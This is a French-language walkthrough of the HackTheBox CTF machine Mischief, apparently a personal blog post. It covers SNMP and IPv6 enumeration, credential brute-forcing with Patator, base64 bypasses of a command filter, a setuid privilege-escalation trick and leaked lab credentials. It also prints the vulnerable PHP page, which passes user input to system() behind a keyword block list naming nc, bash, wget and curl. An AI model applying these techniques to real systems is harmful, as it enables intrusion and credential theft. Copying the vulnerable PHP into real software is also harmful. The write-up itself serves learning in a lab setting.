# Solution du CTF Mischief de HackTheBox

Introduction
------------

*Mischief* est une machine Linux proposée comme CTF sur [HackTheBox](https://www.hackthebox.eu/). Je m'y suis penché alors qu'elle était disponible depuis déjà un moment.  

L'avantage indéniable c'est qu'elle est plus stable car moins de participants s'y intéressent et donc il y a moins de reset inopinés... Ce qui ne veut pas dire que je n'ai pas souffert du passage d'autres utilisateurs :'(   

Il n'y avait pas de guessing sur ce CTF. En revanche il y avait un tas de petits détails pour vous pourrir la vie :D  

ScanNe Mes Ports
----------------

Bien sûr on commence par scanner les ports de la machine. *Nmap* est de la partie :  

```plain
Nmap scan report for 10.10.10.92
Host is up (0.027s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4
| ssh-hostkey:
|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
| ssh2-enum-algos:
|   kex_algorithms: (10)
|   server_host_key_algorithms: (5)
|   encryption_algorithms: (6)
|   mac_algorithms: (10)
|_  compression_algorithms: (2)
3366/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)
|_http-fetch: Please enter the complete path of the directory to save data in.
|_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_unusual-port: caldav unexpected on port tcp/3366
```

On a un service web en écoute via le module *SimpleHTTP* de Python.  

*Nmap* mentionne le logiciel *Radicale* mais c'est vraisemblablement un faux positif (la signature a du matcher faute de mieux car on ne voit rien mentionnant *Radicale* dans les headers HTTP).  

Le site requiert une authentification et si on cherche d'autres dossiers et fichiers impossible de mettre la main sur une page non protégée.  

Bien sûr on peut se fendre d'un petit *Patator* pour essayer de trouver des credentials valides :  

```plain
$ patator http_fuzz url=http://10.10.10.92:3366/ user_pass=test:FILE0 0=top500.txt -x ignore:code=401
11:39:02 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2018-10-20 11:39 CEST
11:39:02 patator    INFO -
11:39:02 patator    INFO - code size:clen       time | candidate                          |   num | mesg
11:39:02 patator    INFO - -----------------------------------------------------------------------------
11:39:07 patator    INFO - Hits/Done/Skip/Fail/Size: 0/499/0/0/499, Avg: 93 r/s, Time: 0h 0m 5s
```

Ici j'essaye de trouver un pass pour un utilisateur *test* car le *realm* (présent dans l'entête spécifiant l'authentification basic) était *Test*.  

Hmmmm et aucun port UDP n'est ressorti... En tout cas lors du premier scan car un nouvel essai s'avère plus expressif :  

```plain
$ sudo nmap -T5 -sU 10.10.10.92
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-20 11:56 CEST
Nmap scan report for 10.10.10.92
Host is up (0.027s latency).
Not shown: 999 open|filtered ports
PORT    STATE SERVICE
161/udp open  snmp
```

Dès lors on peut se servir de différents outils pour extraire les infos du port SNMP : *snmpwalk*, *Nmap*, *Metasploit*, etc  

J'ai eu recours au module *auxiliary/scanner/snmp/snmp\_enum* de *Metasploit* qui m'a retourné entre autres ces informations :  

```plain
Host IP                       : 10.10.10.92
Hostname                      : Mischief
Description                   : Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
Contact                       : Me <me@example.org>
Location                      : Sitting on the Dock of the Bay
Uptime snmp                   : 02:43:36.84
Uptime system                 : 02:43:24.55
System date                   : 2018-10-20 10:01:12.0
```

Des infos concernant l'interface réseau :  

```plain
Interface                     : [ up ] Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)
Id                            : 2
Mac Address                   : 00:50:56:b9:cb:07
Type                          : ethernet-csmacd
Speed                         : 1000 Mbps
MTU                           : 1500
In octets                     : 107438953
Out octets                    : 95284197
```

On note ici l'absence d'IPv6. Suit alors les ports en écoute :  

```plain
[*] TCP connections and listening ports:

Local address       Local port          Remote address      Remote port         State
0.0.0.0             22                  0.0.0.0             0                   listen
0.0.0.0             3366                0.0.0.0             0                   listen
127.0.0.1           3306                0.0.0.0             0                   listen
127.0.0.53          53                  0.0.0.0             0                   listen

[*] Listening UDP ports:

Local address       Local port
0.0.0.0             161
0.0.0.0             49574
127.0.0.53          53
```

Je vous fait grâce de la liste des points de montage et leur taille, les paquets installés et leur version, les infos de CPU et la listes des process mais ce qu'il faut en retenir c'est que la distribution est une *Ubuntu Bionic* (donc récente et vraisemblablement pas faillible en l'état).  

Il y a tout de même quelques points intéressants dans les process comme la présence de *atd*, *crond*, *lxcfs*, mysqld et *Apache* ainsi que les process suivants :  

```bash
bash -c /home/loki/hosted/webstart.sh
python -m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/
```

Bizarre qu'un Apache soit en écoute et qu'on ne trouve pas de port TCP associé, mais pour le moment utilisons les identifiants *SimpleHTTPAuthServer* pour passer l'authentification web.  

Loki's playing tricks again
---------------------------

La page web contient une image du dieu nordique *Loki* provenant [d'un vieux manuscrit](https://en.wikipedia.org/wiki/Icelandic_Manuscript%2C_S%C3%81M_66).  

On trouve surtout deux identifiants :  

* loki / godofmischiefisloki que l'on a déjà
* loki / trickeryanddeceit

Ce second identifiant ne nous permet malheureusement pas de nous connecter en tant que *loki* via SSH.  

Où utiliser ces identifiants ? Il est temps de se pencher sur le cas d'Apache : peut être que SNMP a omis d'indiquer l'adresse IPv6 dans les informations concernant l'interface réseau.  

Dès lors on peut essayer de calculer l'adresse link-local depuis l'adresse MAC à l'aide [d'un site web](https://ben.akrin.com/?p=1347) [à cet effet](http://www.sput.nl/internet/ipv6/ll-mac.html) ce qui nous donne l'adresse IPv6 *fe80::250:56ff:feb9:cb07*.  

Malheureusement ça sent mauvais : pas de réponse au ping, pas de ports ouverts...  

J'ai refait le scan SNMP cette fois avec *snmpwalk* mais une recherche sur IPv6 ne retournait rien de probant...  

[felli0t](https://twitter.com/felli0t) m'a conseillé de me pencher sur un outil créé par l'auteur du CTF et en effet on trouve sur le répo Github de *Trickster0* un outil nommé [Enyx](https://github.com/trickster0/Enyx) qui ne fait qu’appeler *snmpwalk* pour extraire et parser les codes *1.3.6.1.2.1.4.34.1.3* qui correspondent aux infos IPv6 (ça ne s'invente pas).  

Il y a aussi [un article de Cisco sur le sujet](http://docwiki.cisco.com/wiki/How_to_get_IPv6_address_via_SNMP).  

Via *snmpwalk* on a ça :  

```plain
$ snmpwalk -c public -v 2c 10.10.10.92 1.3.6.1.2.1.4.34.1.3
iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.92 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.255 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.1.4.127.0.0.1 = INTEGER: 1
iso.3.6.1.2.1.4.34.1.3.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 1
iso.3.6.1.2.1.4.34.1.3.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.185.68.58 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.185.68.58 = INTEGER: 2
```

On a par exemple les chiffres 254.128 qui correspondent au début d'adresse (fe80). C'est bien plus agréable avec *Enyx* :  

```plain
$ python enyx.py 2c public 10.10.10.92
###################################################################################
#                                                                                 #
#                      #######     ##      #  #    #  #    #                      #
#                      #          #  #    #    #  #    #  #                       #
#                      ######    #   #   #      ##      ##                        #
#                      #        #    # #        ##     #  #                       #
#                      ######  #     ##         ##    #    #                      #
#                                                                                 #
#                           SNMP IPv6 Enumerator Tool                             #
#                                                                                 #
#                   Author: Thanasis Tserpelis aka Trickster0                     #
#                                                                                 #
###################################################################################

[+] Snmpwalk found.
[+] Grabbing IPv6.
[+] Loopback -> 0000:0000:0000:0000:0000:0000:0000:0001
[+] Unique-Local -> dead:beef:0000:0000:0250:56ff:feb9:443a
[+] Link Local -> fe80:0000:0000:0000:0250:56ff:feb9:443a
```

On peut lancer un scan Nmap sur cette nouvelle adresse. Nmap semble avoir du mal avec la notation *ip%interface* mais en spécifiant l'interface avec l'option *-e* ça passe.  

On trouve alors un classique port 80 :)  

![Mischief IPv6 Apache HackTheBox CTF](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/mischief_ipv6.png)

Le site web a une page de login et le mot de passe ne fonctionne pas avec l'utilisateur *loki*. J'ai donc placé les deux passwords dans un fichier, ajouté un top 500 des mots de passe classiques et fait de même pour les utilisateurs.  

Cette fois pas d'authentification HTTP basic alors on se base sur un match du contenu pour écarter les logins échoués avec *Patator* (j'ai du ajouter une entrée à */etc/hosts* car *Patator* digère mal les IP v6) :  

```plain
$ patator http_fuzz url='http://mischief.htb/login.php' method=POST body='user=FILE0&password=FILE1' 0=users.txt 1=password.txt -x ignore:fgrep='those credentials do not match'
13:51:24 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2018-10-21 13:51 CEST
13:51:24 patator    INFO -
13:51:24 patator    INFO - code size:clen       time | candidate                          |   num | mesg
13:51:24 patator    INFO - -----------------------------------------------------------------------------
13:51:39 patator    INFO - 302  918:566        2.006 | administrator:trickeryanddeceit    |  3022 | HTTP/1.1 302 Found
```

Une fois connecté on a un champ de texte pour la saisie d'une commande Linux. On se rend vite compte que certaines commandes sont bloquées mais que ceci est facilement bypassable.  

*whoami* fait partie des commandes autorisées. On voit aussi une référence à un fichier nommé *credentials*.  

![Mischief IPv6 RCE Apache HackTheBox CTF](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/mischief_rce.png)

A titre d'exemple on ne peut pas utiliser *ls* ou son alias *dir* mais on peut exécuter ça :  

```bash
python -c "import glob; print glob.glob('*')" #
```

ou encore via base64 :  

```bash
echo bHM= | base64 -d | sh #
```

Le caractère dièse permet de commenter ce qui se trouve après nos commandes car il semble que l'output soit redirigé quelque part sinon.  

A ce stade on aimerait bien avoir un shell en tant que *www-data* mais on est dans un cas classique où on ne peut pas placer une clé SSH pour cet utilisateur.  

Les règles de pare feu semblent aussi nous empêcher d'obtenir un reverse shell. Pour confirmer cela on peut utiliser le one-liner Python suivant qui scanne nos ports et mettre un sniffer en écoute :  

```python
import socket;[socket.socket().connect_ex(('10.10.13.178', i)) for i in range(0,65536)]
```

Du coup on oublie pour le moment et on s'en remet au contenu du fichier *credentials* que l'on peut obtenir de la façon suivante pour éviter l'un des filtres présents :  

```bash
cat /home/loki/cred* #
```

On obtient alors 
> pass: lokiisthebestnorsegod

Il est aussi possible d'exfiltrer le contenu du fichier via ICMP (voir [ma solution du CTF Persistence](http://devloop.users.sourceforge.net/index.php?article106/solution-du-ctf-persistence)) mais c'est clairement overkill pour notre cas puisqu'on peut obtenir l'output.  

Si j'connaissais l'con qu'a fait sauter le pont...
--------------------------------------------------

Via ces identifiants on peut finalement obtenir un accès SSH en tant que *loki* et accéder au premier flag (apparemment certains ont eu la consigne de ne plus poster les flags donc je m'adapte) :  

```plain
loki@Mischief:~$ md5sum user.txt
1db6b29e3f4246e5b4c1ae0a082dca98  user.txt
```

Parce que c'est toujours bon de savoir après coup ce qu'il se passait voici le code PHP pour l'exécution de commande :  

```php
<?php
if(isset($_POST['command'])) {
    $cmd = $_POST['command'];
    if (strpos($cmd, "nc" ) !== false){
        echo "Command is not allowed.";
    } elseif (strpos($cmd, "bash" ) !== false){
        echo "Command is not allowed.";
    } elseif (strpos($cmd, "chown" ) !== false){
        echo "Command is not allowed.";
    } elseif (strpos($cmd, "setfacl" ) !== false){
        echo "Command is not allowed.";
    } elseif (strpos($cmd, "chmod" ) !== false){
        echo "Command is not allowed.";
    } elseif (strpos($cmd, "perl" ) !== false){
        echo "Command is not allowed.";
    } elseif (strpos($cmd, "find" ) !== false){
        echo "Command is not allowed.";
    } elseif (strpos($cmd, "locate" ) !== false){
        echo "Command is not allowed.";
    } elseif (strpos($cmd, "ls" ) !== false){
        echo "Command is not allowed.";
    } elseif (strpos($cmd, "php" ) !== false){
        echo "Command is not allowed.";
    } elseif (strpos($cmd, "wget" ) !== false){
        echo "Command is not allowed.";
    } elseif (strpos($cmd, "curl" ) !== false){
        echo "Command is not allowed.";
    } elseif (strpos($cmd, "dir" ) !== false){
        echo "Command is not allowed.";
    } elseif (strpos($cmd, "ftp" ) !== false){
        echo "Command is not allowed.";
    } elseif (strpos($cmd, "telnet" ) !== false){
        echo "Command is not allowed.";
    } else {
        system("$cmd > /dev/null 2>&1");
        echo "Command was executed succesfully!";
    }
}
?>
```

Et dans */var/www/html/database.php* on trouve les identifiants suivants :  

```php
$server = 'localhost';
$username = 'debian-sys-maint';
$password = 'nE1S9Aw1L0Ky3Y9h';
$database = 'dbpanel';
```

On s'empresse d'essayer se password pour obtenir le root mais on découvre que les accès à *su* et *sudo* sont refusés (en fait on l'aura remarqué plus tôt car faire un *sudo -l* est une commande classique pour les CTFs).  

En se penchant sur les binaires on remarque ce petit *plus* (héhé) ajouté par l'administrateur :  

```plain
-rwsr-xr-x+ 1 root root  44664 Jan 25  2018 /bin/su
-rwsr-xr-x+ 1 root root 149080 Jan 18  2018 /usr/bin/sudo
```

Il y a donc des ACLs qui ont été rajoutés sur les fichiers. Ces derniers sont consultables avec *getfacl* :  

```plain
# file: bin/su
# owner: root
# group: root
# flags: s--
user::rwx
user:loki:r--
group::r-x
mask::r-x
other::r-x
```

Ici clairement on peut lire le binaire mais on ne peut pas l'exécuter... aucun intérêt :D   

Vu que l'on ne peut pas tricher sur les permissions, j'ai employé la technique suivante :  

1. Créer un dossier word-writable (*chmod 777*) *.devloop* dans le home de *loki*
2. Ecrit et compilé un code C permettant de faire un *setreuid(33, 33)* (ID de *www-data*) suivi d'un *system("/bin/bash -p")*
3. Depuis l'interface web, copier le binaire sous un autre nom mais dans le même dossier
4. Depuis l'interface web, placer le bit setuid sur le binaire copié (*chmod 4755*)
5. Exécuter en tant que *loki* le binaire permettant d'avoir un shell *www-data*
6. Finalement pouvoir exécuter *su* sans souci de permission

Tout ça pour un mot de passe qui ne fonctionne pas :'D  

J'ai aussi eu une surprise en copiant au début le binaire vers */tmp* depuis l'interface web de ne pas le retrouver avec le compte *loki*.  

J'ai d'abord pensé à de la *black magic fuckery* lié à la présence de *LXC* mais après une bonne nuit je me suis rappelé avoir déjà vu ça avec Apache (c'est une fonctionnalité de *systemd* qui fait en sorte que le */tmp* du process apache ne corresponde pas à celui du système).  

Il est peut être temps de fouiller dans la base de données :  

```plain
mysql> show tables;
+-------------------+
| Tables_in_dbpanel |
+-------------------+
| users             |
+-------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+---------------+--------------------------------------------------------------+
| id | user          | password                                                     |
+----+---------------+--------------------------------------------------------------+
|  2 | administrator | $2y$10$0OeEYPgdvzU1XTLsKUkaIuyN3PTBQSC4oALTICEZOllPJKq1uUAkq |
+----+---------------+--------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> select Host,User,authentication_string from user;
+-----------+------------------+-------------------------------------------+
| Host      | User             | authentication_string                     |
+-----------+------------------+-------------------------------------------+
| localhost | root             |                                           |
| localhost | mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
| localhost | mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
| localhost | debian-sys-maint | *502DB40510A81AD85992AB68C4A75B682E03E7EF |
+-----------+------------------+-------------------------------------------+
4 rows in set (0.00 sec)
```

Les seuls hashs valides sont ceux que l'on connait déjà en clairs :(   

J'ai fouillé comme un fou (process, ports en écoute, exécutables setuid, fichiers writables, crontab, recherche dans etc, password reuse...) pour nada, peanuts, zéro, null, *Lord Nothing*, keud', void\*...  

J'ai même changé le mot de passe de l'utilisateur root de MySQL ainsi que sa méthode de connexion (il était en *auth\_socket*) dès fois qu'il y ait un module *PAM* quelque part qui relie le compte Unix au compte MySQL (alors que j'ai rien vu dans les fichiers de conf)... X'D  

Finalement j'ai fait un reset de la box et là c'est apparu devant mes yeux ébahis :  

```plain
loki@Mischief:~$ cat .bash_history
python -m SimpleHTTPAuthServer loki:lokipasswordmischieftrickery
exit
free -mt
ifconfig
cd /etc/
sudo su
su
exit
su root
ls -la
sudo -l
ifconfig
id
cat .bash_history
nano .bash_history
exit
```

Si j'connaissais l'con qu'a touché à l'historique ! :p  

Cette fois on peut utiliser *su* pour passer root :)  

T'as mangé du clown toi !
-------------------------

Sereinement on affiche le contenu du fichier *root.txt* et on a un message comme quoi le flag n'est pas là... *\*self-control\**  

Heureusement on n'a pas besoin de chercher bien loin (ça m'a fatigué ces bêtises) :  

```plain
root@Mischief:~# find / -name "root.txt" 2> /dev/null
/usr/lib/gcc/x86_64-linux-gnu/7/root.txt
/root/root.txt
root@Mischief:~# md5sum /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
8ddb1b20c525dbd142d79457f2a1d47c  /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
```

Victoire
--------

Bilan des courses, j'ai appris quelque chose sur SNMP. Pour le reste ce qui rendait le CTF difficile c'était ces petits moments casse-bonbon, je suis content d'en être arrivé à bout :)  


*Published January 05 2019 at 16:34*